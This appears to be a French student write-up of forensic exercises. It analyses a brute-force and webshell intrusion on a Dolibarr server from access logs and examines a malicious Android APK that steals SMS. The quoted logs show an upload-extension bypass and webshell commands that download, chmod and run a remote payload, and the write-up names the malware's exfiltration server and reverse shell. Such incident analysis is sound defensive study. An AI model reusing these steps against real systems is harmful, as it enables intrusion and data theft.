# Exercice 1 : 

### Question 4 :

Grâce à wireshark et l'addresse du serveur on peut voir que seul deux addresse ont fait des requêtes de connexion acceptées :

    192.168.1.17 et 192.168.1.14

Et grâce au fichier arp.txt qui a les login en clair on peut faire correpondre les login avec les addresses : 
- 192.168.1.17 : Mobile3
- 192.168.1.14 : PC1

# Exercice 2 :

### Question 1 :

L'attaque Brutforce a commencée à 9h01, on voit de très nombeuses requêtes sur auth.php : 


    192.168.1.10 - - [23/May/2023:09:01:24 +0100] "POST /dolibarr/htdocs/modules/auth.php HTTP/1.1" 200 7535 "-" "Wget/1.21"

    192.168.1.10 - - [23/May/2023:09:01:26 +0100] "POST /dolibarr/htdocs/modules/auth.php HTTP/1.1" 200 7535 "-" "Wget/1.21"

    192.168.1.10 - - [23/May/2023:09:01:28 +0100] "POST /dolibarr/htdocs/modules/auth.php HTTP/1.1" 200 7535 "-" "Wget/1.21"

### Question 2 : 

L'attaquant a testé  .php,.phtml,.php3,.php4,.php5,.php6,.php7 et .phar, on peut désormais identifié l'attaaquant authentifié sur le user  64nxlskk.php :

    192.168.1.10 - - [23/May/2023:09:54:17 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php?id=2 HTTP/1.1" 200 7439 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:17 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:17 +0100] "POST /dolibarr/htdocs/user/64nxlskk.phtml?id=2 HTTP/1.1" 200 7778 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phtml?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php3?id=2 HTTP/1.1" 200 7817 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php3?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php4?id=2 HTTP/1.1" 200 7861 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php4?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php5?id=2 HTTP/1.1" 200 7893 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php5?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"

    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php6?id=2 HTTP/1.1" 200 7936 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
    
    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php6?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"
    
    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.php7?id=2 HTTP/1.1" 200 7976 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.php7?cmd=id HTTP/1.1" 404 490 "-" "python-requests/2.25.1"
    
    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "POST /dolibarr/htdocs/user/64nxlskk.phar?id=2 HTTP/1.1" 200 7736 "http://www.pms.com/dolibarr/htdocs/" "python-requests/2.25.1"
    
    192.168.1.10 - - [23/May/2023:09:54:18 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=id HTTP/1.1" 200 257 "-" "python-requests/2.25.1"

### Question 3 : 

L'attaquant utilise alors l'extension .phar car c'est la dernière extension qu'il a testé et c'est celle avec laquelle il fait les requêtes suivantes : 

    192.168.1.10 - - [23/May/2023:09:54:21 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=id HTTP/1.1" 200 258 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"

### Question 4 : 

On peut ensuite voir qu'il télécharge le fichier "fiche_de_poste.odt" en faisant **"wget http://240.123.207.20/fiche_de_poste.odt"** : 

    192.168.1.10 - - [23/May/2023:09:55:20 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=wget%20http://240.123.207.20/fiche_de_poste.odt HTTP/1.1" 200 486 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"

Qu'il renomme ce dernier en "fiche de paie" avec : **"mv fiche_de_poste.odt fiche_de_poste"** : 

    192.168.1.10 - - [23/May/2023:09:55:38 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=mv%20fiche_de_poste.odt%20fiche_de_poste HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"

Pour ensuite le rendre exécutable par tout le monde avec **"chmod 755 fiche_de_poste"** : 

    192.168.1.10 - - [23/May/2023:09:55:52 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=chmod%20755%20fiche_de_poste HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"

Et enfin il l'exécute avec **"./fiche_de_poste"** : 

    192.168.1.10 - - [23/May/2023:09:58:22 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=./fiche_de_poste HTTP/1.1" 200 245 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"


# Exercice 4 : 

### Question 1 : 

Les modules de Kotlin ont été importés, ont peu donc supposés que c'est une application android écrit en Kotlin. 

### Question 2 :

On retrouve que l'archive contient les permissions de lire les SMS, Recevoir une notification du démarrage de l'appareil et accès a internet en faisant la commande suivante sur l'apk : 

    $ aapt dump permissions base.apk 

    package: com.android.updateserver
    uses-permission: name='android.permission.READ_SMS'
    uses-permission: name='android.permission.RECEIVE_BOOT_COMPLETED'
    uses-permission: name='android.permission.INTERNET'

### Question 3 :

On peut retrouver que la version de android core utilisée et la 1.5.0 : 

    $ cd META-INF
    $ cat androidx.core_core.version 
    1.5.0

### Question 4 :

Le language de programmation décompilé est java comme on peut le voir dans le dossier kotlin, les extensions sont .java. Ceci peut s'expliquer car le kotlin est un language de programmation basé sur du Java.

### Question 5 : 

L'addresse du serveur peut se retrouver dans DumpData.java dans les attributs de la classe, on retrouve alors :**"sms.pms.droid.vubugzurwpehppqzwsshvypjwtmxkekg.xyz:8888"**

    public class DumpData {
        public static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
        private static String SERVER_IP = "sms.pms.droid.vubugzurwpehppqzwsshvypjwtmxkekg.xyz";

### Question 6 :

L'autre fichier a pour fonction lui de créer un thread afin de donner l'accès au shell de la machine depuis un poste distant, pour cela il utilise un socket sur lequel il va relier l'entrée standart et les sorties standarts.
